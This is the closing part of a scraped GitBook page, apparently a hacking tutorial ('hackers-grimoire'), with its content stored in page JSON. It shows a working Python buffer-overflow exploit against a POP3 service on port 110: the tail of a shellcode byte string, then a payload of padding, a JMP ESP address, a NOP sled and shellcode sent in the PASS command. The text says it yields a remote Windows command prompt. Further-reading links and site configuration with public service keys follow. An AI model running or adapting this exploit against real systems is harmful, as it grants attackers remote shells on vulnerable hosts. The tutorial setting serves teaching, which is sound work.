(\"\\xdb\\xde\\xb8\\x85\\x0f\\xbe\\x9d\\xd9\\x74\\x24\\xf4\\x5a\\x29\\xc9\\xb1\""}]}]},{"kind":"block","type":"code-line","key":"3dbc0926bab940d697fdf59a750596b4","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"47d2067911ce4a1d9bb08e8fab778998","ranges":[{"kind":"range","marks":[],"text":"\"\\x52\\x31\\x42\\x17\\x83\\xea\\xfc\\x03\\xc7\\x1c\\x5c\\x68\\x3b\\xca\\x22\""}]}]},{"kind":"block","type":"code-line","key":"92fa81f8de1346b38e3953e4df31c5f4","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"3dcc90fce4b9470ba35ad6e9221a6535","ranges":[{"kind":"range","marks":[],"text":"\"\\x93\\xc3\\x0b\\x43\\x1d\\x26\\x3a\\x43\\x79\\x23\\x6d\\x73\\x09\\x61\\x82\""}]}]},{"kind":"block","type":"code-line","key":"7291680558de42348bb01528451d0728","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"324850a123e4465cbe9ae3f1d4c52076","ranges":[{"kind":"range","marks":[],"text":"\"\\xf8\\x5f\\x91\\x11\\x8c\\x77\\x96\\x92\\x3b\\xae\\x99\\x23\\x17\\x92\\xb8\""}]}]},{"kind":"block","type":"code-line","key":"5706325eb7ce4344ac364b01c87b45d7","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"43e9df3b60a144ff8a5feb68b57b3579","ranges":[{"kind":"range","marks":[],"text":"\"\\xa7\\x6a\\xc7\\x1a\\x99\\xa4\\x1a\\x5b\\xde\\xd9\\xd7\\x09\\xb7\\x96\\x4a\""}]}]},{"kind":"block","type":"code-line","key":"96b5ab10de194b69add50731c79564be","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"7d6237bea97c4ce5b475a8da5d03c971","ranges":[{"kind":"range","marks":[],"text":"\"\\xbd\\xbc\\xe3\\x56\\x36\\x8e\\xe2\\xde\\xab\\x47\\x04\\xce\\x7a\\xd3\\x5f\""}]}]},{"kind":"block","type":"code-line","key":"8125575aa29a41718ee778201a1e0fe5","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"6c489646fec048fcba05e310d1e98157","ranges":[{"kind":"range","marks":[],"text":"\"\\xd0\\x7d\\x30\\xd4\\x59\\x65\\x55\\xd1\\x10\\x1e\\xad\\xad\\xa2\\xf6\\xff\""}]}]},{"kind":"block","type":"code-line","key":"232ee019847b426f8aa106f5979e74fe","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"b7b16129093d453eaa53dc093cd06096","ranges":[{"kind":"range","marks":[],"text":"\"\\x4e\\x08\\x37\\x30\\xbd\\x50\\x70\\xf7\\x5e\\x27\\x88\\x0b\\xe2\\x30\\x4f\""}]}]},{"kind":"block","type":"code-line","key":"83b7ead7ae4042b59fb35400295f8c76","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"8ffc269f7e2e407eb8b5ed17a797afd5","ranges":[{"kind":"range","marks":[],"text":"\"\\x71\\x38\\xb4\\x4b\\xd1\\xcb\\x6e\\xb7\\xe3\\x18\\xe8\\x3c\\xef\\xd5\\x7e\""}]}]},{"kind":"block","type":"code-line","key":"f83335713d25416698a6ba5c2137db54","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"d1ede91b8d0742a1b0b34662722ee767","ranges":[{"kind":"range","marks":[],"text":"\"\\x1a\\xec\\xe8\\x53\\x11\\x08\\x60\\x52\\xf5\\x98\\x32\\x71\\xd1\\xc1\\xe1\""}]}]},{"kind":"block","type":"code-line","key":"fe5e7084b65449a28dca622925114d1c","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"98db3f79139944c38121ef9577679d34","ranges":[{"kind":"range","marks":[],"text":"\"\\x18\\x40\\xac\\x44\\x24\\x92\\x0f\\x38\\x80\\xd9\\xa2\\x2d\\xb9\\x80\\xaa\""}]}]},{"kind":"block","type":"code-line","key":"3871c8ac03f94cacabdc54cbbceebf28","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"35282edb7e9b43b88a25bb248fc32859","ranges":[{"kind":"range","marks":[],"text":"\"\\x82\\xf0\\x3a\\x2b\\x8d\\x83\\x49\\x19\\x12\\x38\\xc5\\x11\\xdb\\xe6\\x12\""}]}]},{"kind":"block","type":"code-line","key":"4a67f14937304cad8950a51d8a551d65","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"39662a2336e44982b34c7b0d2ee1be6a","ranges":[{"kind":"range","marks":[],"text":"\"\\x55\\xf6\\x5f\\x8c\\xa8\\xf9\\x9f\\x85\\x6e\\xad\\xcf\\xbd\\x47\\xce\\x9b\""}]}]},{"kind":"block","type":"code-line","key":"f49a838b01544f0599bcbec0094bc45d","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"87102a41f9ea4bfbb5f187e01b8c6038","ranges":[{"kind":"range","marks":[],"text":"\"\\x3d\\x67\\x1b\\x0b\\x6d\\xc7\\xf4\\xec\\xdd\\xa7\\xa4\\x84\\x37\\x28\\x9a\""}]}]},{"kind":"block","type":"code-line","key":"3d35547dc8b94013a23651c7e905fe49","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"8973b7c31ed946c98fdb6b1574b41eb3","ranges":[{"kind":"range","marks":[],"text":"\"\\xb5\\x38\\xe2\\xb3\\x5c\\xc3\\x65\\xb6\\xab\\xcb\\x27\\xae\\xa9\\xcb\\xc6\""}]}]},{"kind":"block","type":"code-line","key":"4c70ed501c12493ab855147dc4473968","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"621039b5e14f4697a94dad5b96a7deec","ranges":[{"kind":"range","marks":[],"text":"\"\\x95\\x27\\x2d\\xa2\\xf9\\x61\\xe6\\x5b\\x63\\x28\\x7c\\xfd\\x6c\\xe6\\xf9\""}]}]},{"kind":"block","type":"code-line","key":"4acdec034cf648e3aff0ecfacb0bfe36","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"6bc43ee1c5a84251bdbfc8579bd8525f","ranges":[{"kind":"range","marks":[],"text":"\"\\x3d\\xe6\\x05\\xfe\\xf0\\x0f\\x63\\xec\\x65\\xe0\\x3e\\x4e\\x23\\xff\\x94\""}]}]},{"kind":"block","type":"code-line","key":"bf8fa12a75934ddfb518b7e6ef2828fc","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"37ebd3500dae498381b664790d82b139","ranges":[{"kind":"range","marks":[],"text":"\"\\xe6\\xaf\\x92\\x72\\xf6\\xa6\\x8e\\x2c\\xa1\\xef\\x61\\x25\\x27\\x02\\xdb\""}]}]},{"kind":"block","type":"code-line","key":"8295d85b09dd4f58b36765e89ae5c2b1","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"b865733255294c2885bd9f871fcaedf0","ranges":[{"kind":"range","marks":[],"text":"\"\\x9f\\x55\\xdf\\xbd\\xd8\\xdd\\x04\\x7e\\xe6\\xdc\\xc9\\x3a\\xcc\\xce\\x17\""}]}]},{"kind":"block","type":"code-line","key":"f8cef086af384c5cacd991fa856cba4c","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"07ec27c858fe4d1688617ad2a38d939f","ranges":[{"kind":"range","marks":[],"text":"\"\\xc2\\x48\\xba\\xc7\\x95\\x06\\x14\\xae\\x4f\\xe9\\xce\\x78\\x23\\xa3\\x86\""}]}]},{"kind":"block","type":"code-line","key":"d8e3671a327c48d79b6220e27e67f01d","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"df88b24ca22c460a9e71fbeb01704a92","ranges":[{"kind":"range","marks":[],"text":"\"\\xfd\\x0f\\x74\\xd0\\x01\\x5a\\x02\\x3c\\xb3\\x33\\x53\\x43\\x7c\\xd4\\x53\""}]}]},{"kind":"block","type":"code-line","key":"19b3ee7bdfa34727a9587d9c2704174a","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"83a141758a174110aeffb5cfa7e2bcaf","ranges":[{"kind":"range","marks":[],"text":"\"\\x3c\\x60\\x44\\x9b\\x97\\x20\\x74\\xd6\\xb5\\x01\\x1d\\xbf\\x2c\\x10\\x40\""}]}]},{"kind":"block","type":"code-line","key":"8fbe803563aa4716bcb73884cff21983","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"924cd625bf1c40388c261a591a28ccbc","ranges":[{"kind":"range","marks":[],"text":"\"\\x40\\x9b\\x57\\x7d\\xc3\\x29\\x28\\x7a\\xdb\\x58\\x2d\\xc6\\x5b\\xb1\\x5f\""}]}]},{"kind":"block","type":"code-line","key":"51f8883ed5124b60be50184972814d75","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"23cf8730ddc6491782a8fe8b7c2cc3fc","ranges":[{"kind":"range","marks":[],"text":"\"\\x57\\x0e\\xb5\\xcc\\x58\\x1b\")"}]}]},{"kind":"block","type":"code-line","key":"73ba51dea16246129cb27389fbc30246","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"f2266048dede4b06891421e7f908e246","ranges":[{"kind":"range","marks":[],"text":""}]}]},{"kind":"block","type":"code-line","key":"5691de0f3e084764bab9c8b860ce2284","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"ef445d296a6f4eff8b603845bc943e9f","ranges":[{"kind":"range","marks":[],"text":"# Exploit string: 2606 As + JMP ESP memory address + nops + shellcode"}]}]},{"kind":"block","type":"code-line","key":"edc7a1ba4aaa40edb1746ebd56008ded","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"610127f58ee645759f3fa13f50a9fd0a","ranges":[{"kind":"range","marks":[],"text":"buffer=\"A\" * 2606 + \"\\x8f\\x35\\x4a\\x5f\" + \"\\x90\" * 16 + shellcode"}]}]},{"kind":"block","type":"code-line","key":"a0894c284c464d969bb8b2159f6c2702","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"1c1a3cf6d0de435db1367d442ccf29f6","ranges":[{"kind":"range","marks":[],"text":"try: "}]}]},{"kind":"block","type":"code-line","key":"e899e03478884d34b3b0d963f865b378","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"693ba28977d74575afc80044aac560c3","ranges":[{"kind":"range","marks":[],"text":"\tprint \"\\nSending buffer...\""}]}]},{"kind":"block","type":"code-line","key":"4af1b280951343f0b8b963f4c00e1651","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"9908f496fbef492fbb558ac9268002ad","ranges":[{"kind":"range","marks":[],"text":"# Connect to Windows 7 machine"}]}]},{"kind":"block","type":"code-line","key":"66bd6919acf64d28b3f6f53a59e5cdf6","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"ce10307e9c004ca3816d3b257708b63c","ranges":[{"kind":"range","marks":[],"text":"\ts.connect(('10.0.0.1',110))"}]}]},{"kind":"block","type":"code-line","key":"90757cf0e7f74b7990529ccaed2ce019","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"7f51b6f84fdf4a33a6f4b4ae15c7d717","ranges":[{"kind":"range","marks":[],"text":"\tdata = s.recv(1024)"}]}]},{"kind":"block","type":"code-line","key":"9fab245f8273471ea1210c62ab71dfc6","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"7ff68f3a3fa645ad893b0e7b94c41921","ranges":[{"kind":"range","marks":[],"text":"\ts.send('USER username'+ '\\r\\n')"}]}]},{"kind":"block","type":"code-line","key":"04077155c3eb452c8aea8d82039acfb9","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"4cc51e9cb7564b86b0f1cc4dc1c3878d","ranges":[{"kind":"range","marks":[],"text":"\tdata = s.recv(1024)"}]}]},{"kind":"block","type":"code-line","key":"77fbe2bc535742f8b1f5d1d2d9c9c11b","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"ce39f2facb204ac083db46c5c4186caf","ranges":[{"kind":"range","marks":[],"text":"\ts.send('PASS ' + buffer + '\\r\\n')"}]}]},{"kind":"block","type":"code-line","key":"ee18050aa6cd46c78123bae328dd0b7e","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"8807895c2b2a4f74acc0874a7ee43045","ranges":[{"kind":"range","marks":[],"text":"\ts.close()"}]}]},{"kind":"block","type":"code-line","key":"3f43b5d02934419fa0ec8ebcc32593db","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"aa9e7a2dd82c4ba382c264eb0749bdbf","ranges":[{"kind":"range","marks":[],"text":"\tprint \"\\ Done.\""}]}]},{"kind":"block","type":"code-line","key":"67cbfee7f6b845dd8e205ca2e9646332","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"76edc86bd04e4cf48c406ea301fa0336","ranges":[{"kind":"range","marks":[],"text":"except:"}]}]},{"kind":"block","type":"code-line","key":"e7eb38cf19434ce49d69edd7766d6e8b","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"084c52fdafa44794bc4daf8b4b81a486","ranges":[{"kind":"range","marks":[],"text":"\tprint \"Could not connect!\""}]}]},{"kind":"block","type":"code-line","key":"e2f7a0a9b6f043b9882b0c54f0dfe8c7","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"a1ddcb171005454183ffba0b3d7d89f3","ranges":[{"kind":"range","marks":[],"text":""}]}]}]},{"kind":"block","type":"paragraph","key":"9298e35c407246cd9e92af195937896a","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"144e255463e14bcfb46e164d9f323907","ranges":[{"kind":"range","marks":[],"text":"If all goes well, you should get a Windows command prompt on your Kali machine. Assembling the exploit was the easiest part for me. If it doesn't work you, go for a 15-minute walk, cry for a bit, then check your code. It's just a typo somewhere."}]}]},{"kind":"block","type":"heading-2","key":"d4692aa94d8947ca912e34eebd0ae053","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"f303d87fc4a6486586499d778b74d530","ranges":[{"kind":"range","marks":[],"text":"Further reading"}]}]},{"kind":"block","type":"list-unordered","key":"7322a7a0ef2e485c9354c08375566a79","isVoid":false,"data":{},"nodes":[{"kind":"block","type":"list-item","key":"b02184ad09624d5ebab78c7b9a9da8c8","isVoid":false,"data":{},"nodes":[{"kind":"block","type":"paragraph","key":"cd4b79e9cfbf463e9ceb68de5856648f","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"1d18a5aac4ec40749103e4b17b59329c","ranges":[{"kind":"range","marks":[],"text":""}]},{"kind":"inline","type":"link","key":"cbbedf2e47084d11ac3c35dc91912131","isVoid":false,"data":{"href":"http://www.primalsecurity.net/0x7-exploit-tutorial-bad-character-analysis/"},"nodes":[{"kind":"text","key":"365aae984e8d411fa202f26a2331cd04","ranges":[{"kind":"range","marks":[],"text":"0x7 Exploit Tutorial: Bad Character Analysis"}]}]},{"kind":"text","key":"e355f2c9744a467e87343807e1d2ca94","ranges":[{"kind":"range","marks":[],"text":""}]}]}]},{"kind":"block","type":"list-item","key":"7a87eb195bf04311aef8f964bad264f9","isVoid":false,"data":{},"nodes":[{"kind":"block","type":"paragraph","key":"1d928d1708b44dd8afea395442de6f84","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"79eec3ca008849cb89386660c2b88dcb","ranges":[{"kind":"range","marks":[],"text":""}]},{"kind":"inline","type":"link","key":"e5d0efd09b4642b49a87e4a0c363f97d","isVoid":false,"data":{"href":"https://www.hugohirsh.com/?p=509"},"nodes":[{"kind":"text","key":"f279fb1942b044639e8d286cdc3b7580","ranges":[{"kind":"range","marks":[],"text":"Buffer Overflows - an introduction with SLMail"}]}]},{"kind":"text","key":"b4f89e613247491cb6547937cf356e94","ranges":[{"kind":"range","marks":[],"text":""}]}]}]},{"kind":"block","type":"list-item","key":"d4425f76dfad468a9c71258ef6caf625","isVoid":false,"data":{},"nodes":[{"kind":"block","type":"paragraph","key":"cfe60ce35a61421db7351a1ac000d8e1","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"4512fef72fd2470a9290ed32f2a4036b","ranges":[{"kind":"range","marks":[],"text":""}]},{"kind":"inline","type":"link","key":"f706a8e05cd04b10bac7081c5c0919d1","isVoid":false,"data":{"href":"https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/"},"nodes":[{"kind":"text","key":"c1373040d9dc4087aa1fb0b79f58cf49","ranges":[{"kind":"range","marks":[],"text":"Exploit writing tutorial part 1 - stack based overflows"}]}]},{"kind":"text","key":"6fab2867822744138e2fc327462cfa64","ranges":[{"kind":"range","marks":[],"text":""}]}]}]},{"kind":"block","type":"list-item","key":"6d8f96ee0bdb4cd4a5014d29c6b83118","isVoid":false,"data":{},"nodes":[{"kind":"block","type":"paragraph","key":"050b41da6cf14d8babc927f9efa84720","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"c91375d6a0ea477bbff483ffa8b8e93d","ranges":[{"kind":"range","marks":[],"text":""}]},{"kind":"inline","type":"link","key":"8230daa7143b4c81b6ea6ca0ea5bd5e6","isVoid":false,"data":{"href":"https://wmsmartt.wordpress.com/2011/11/25/ability-ftp-2-34-stack-based-buffer-overflow/"},"nodes":[{"kind":"text","key":"6e1980b3160842ceaeea1c3b1d8a433b","ranges":[{"kind":"range","marks":[],"text":"Ability FTP 2.34 stack-based buffer overflow"}]}]},{"kind":"text","key":"55f509de2ad147e38c91de2cbef9019d","ranges":[{"kind":"range","marks":[],"text":""}]}]}]}]},{"kind":"block","type":"paragraph","key":"680c64574d304bd8aa003030d7a4d0d9","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"c6e84f02e37c49298fb764fe21ccce5a","ranges":[{"kind":"range","marks":[],"text":""}]}]},{"kind":"block","type":"paragraph","key":"016f9c8a3d9349ef85227d0af72eb65c","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"c1c5b3390ad146b398b02293d8e6d1b3","ranges":[{"kind":"range","marks":[],"text":"\n"}]}]}]}}}},"user":{"kind":"user","uid":"-M1r-hPbRwYDI9vAWi2T","baseDomain":"","defaultSpace":null,"displayName":"","photoURL":null,"deletedAt":null,"usageStatuses":null,"email":"","emailVerified":false,"disabled":false,"phoneNumber":null,"providers":{},"isVisitor":true,"customClaims":{},"lastLoggedInAt":1583616832359,"createdAt":1583616832359}},"config":{"environment":"production","firebase":{"databaseURL":"https://gitbook-28427.firebaseio.com","apiKey":"AIzaSyBL3yy07hdwBstwhhFTkRtzJA865UQzQVg","authDomain":"app.gitbook.com","projectId":"gitbook-28427","storageBucket":"gitbook-28427.appspot.com","messagingSenderId":"208404988308"},"amplitude":{"key":"fef1e872c952688acd962d30aa545b9e","endpoint":"www.gitbook.com/__amp/"},"intercom":{"app_id":"ajrah9dt"},"zendesk":{"widget_key":"c2b4abc5-eb81-454f-8d35-ba1650332541","subdomain":"gitbook"},"ga":{"spaces":{"id":"UA-57505611-10","view_id":"152688311"},"website":{"id":"UA-57505611-9"}},"slack":{"client_id":"3085992729.251477828931","redirect_uri":"https://hooks.gitbook.com/hooks/slack/oauth"},"sentry":{"url":"https://df403e1abd7046148b272790ec350ce0@sentry.io/193897"},"stripe":{"public_key":"pk_live_iPkbPsG28bjTrkbfHXUq0cA0","plans":{"team_yearly":"plan_GAeDEVtig2ujYe","business_yearly":"plan_ERCJgSzm3Ui1ox","business_monthly":"plan_ERCJFVRMVGgjVZ","startup_yearly":"plan_FpdZWR4TLYnKYH","team_monthly":"plan_GAeDpGXRUSctoE","startup_monthly":"plan_FpdWuSK3BgOldB"},"products":{"team":"prod_GAeD47cc905FaD","startup":"prod_Cd5mCUdVDfZSHY","enterprise":"prod_DpMsO7RlzNd0Ty","business":"prod_DpiRtaS8dvrtrK","legacy":"prod_FROhqd8l1W4Fwg"}},"algolia":{"appid":"Q9UGR6532T"},"clearbit":{"public_key":"pk_e1e4d94ae5385255f0fc7d76d4897ade"},"urls":{"api":"https://api-beta.gitbook.com","spaces":"https://gitbook-28427.firebaseapp.com","website":"https://app.gitbook.com","saml":"https://www.gitbook.com"},"domains":{"spaces":"gitbook.io","cookie":".gitbook.com"},"cdn":{"blobsurl":"https://blobs.gitbook.com/","hosting_cname":"hosting.gitbook.com"},"statuspage":{"domain":"http://status.gitbook.com"},"logrocket":{"key":"fvjtqz/gitbook"},"version":"6.14.1","buildVersion":"6.14.1-b1e2ea9.28801"},"props":{"ownerID":"-LM4E0-lZuZP0jCAcHqW","spaceID":"-LMNRaGfniDGOexfu2Y6","spaceName":"hackers-grimoire","basename":"/hackers-grimoire","location":"/hackers-grimoire/exploitation/buffer-overflow"}};
            </script>
            <script id="__LOADABLE_REQUIRED_CHUNKS__" type="application/json" crossorigin="anonymous" charset="utf-8">[]</script>
<script async data-chunk="space" src="https://static.gitbook.com/js/111.9ea2046f.js" crossorigin="anonymous" charset="utf-8"></script>
        </body>
    </html>
    